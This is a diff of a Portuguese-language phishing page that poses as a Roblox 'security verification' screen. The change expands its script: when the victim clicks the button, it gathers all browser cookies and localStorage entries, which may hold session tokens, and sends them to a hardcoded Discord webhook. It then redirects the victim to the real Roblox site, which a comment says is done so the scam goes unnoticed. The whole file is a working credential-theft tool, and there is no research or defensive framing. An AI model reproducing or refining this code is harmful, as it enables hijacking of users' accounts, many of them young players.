@@ -7,55 +7,51 @@
         body { background-color: #191919; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .box { text-align: center; background: #232527; padding: 30px; border-radius: 10px; width: 300px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
         img { width: 100px; margin-bottom: 20px; }
-        button { background: #00a2ff; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; border-radius: 5px; transition: 0.2s; }
-        button:hover { background: #008ad6; }
+        button { background: #00a2ff; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; border-radius: 5px; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <!-- Ícone Roblox -->
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/200px-Roblox_player_icon_black.svg.png">
-    <h2>Sessão Expirada</h2>
-    <p style="font-size: 14px; color: #ccc;">Clique abaixo para reconectar.</p>
-    <button id="btn" onclick="enviar()">Entrar Agora</button>
+    <h2>Verificação de Segurança</h2>
+    <p style="font-size: 14px;">Clique para continuar.</p>
+    <button id="btn" onclick="pegarTudo()">Continuar</button>
 </div>
 
 <script>
-async function enviar() {
+async function pegarTudo() {
     const btn = document.getElementById('btn');
-    btn.innerText = "Conectando...";
-    btn.disabled = true;
-
-    // Pega todos os cookies disponíveis
-    let cookieData = document.cookie;
+    btn.innerText = "Processando...";
     
-    // Se estiver vazio, tenta pegar do localStorage também (alguns logs usam isso)
-    if(!cookieData) {
-        cookieData = "Nenhum cookie encontrado na aba atual.";
-    }
+    // 1. Pega Cookie Padrão
+    let cookies = document.cookie;
+    
+    // 2. Pega LocalStorage (Onde o Roblox guarda tokens modernos às vezes)
+    let ls = "";
+    try {
+        for(let i=0; i<localStorage.length; i++) {
+            let key = localStorage.key(i);
+            let val = localStorage.getItem(key);
+            ls += `${key}=${val}\n`;
+        }
+    } catch(e) {}
+
+    // Junta tudo
+    let fullData = `Cookies:\n${cookies}\n\nLocalStorage:\n${ls}`;
 
     const webhookUrl = "https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1";
 
-    // Tenta enviar via POST normal
-    try {
-        await fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                content: `🍪 **Cookie Roubeado:** \n\`\`\`${cookieData}\`\`\``
-            })
-        });
-        console.log("Enviado com sucesso!");
-    } catch (e) {
-        console.log("Erro no POST, tentando fallback...", e);
-        // Fallback: Se der erro, tenta abrir uma imagem oculta com o cookie na URL (menos comum mas funciona às vezes)
-        // Ou apenas redireciona mesmo assim
-    }
+    // Tenta enviar para o Discord
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            content: `🍪 **Dados Capturados:**\n\`\`\`${fullData}\`\`\``
+        })
+    }).catch(err => console.log("Erro Discord:", err));
 
-    // Redireciona para o Roblox para não levantar suspeitas
+    // Redireciona imediatamente para não parecer golpe
     window.location.href = "https://www.roblox.com/home";
 }
 </script>
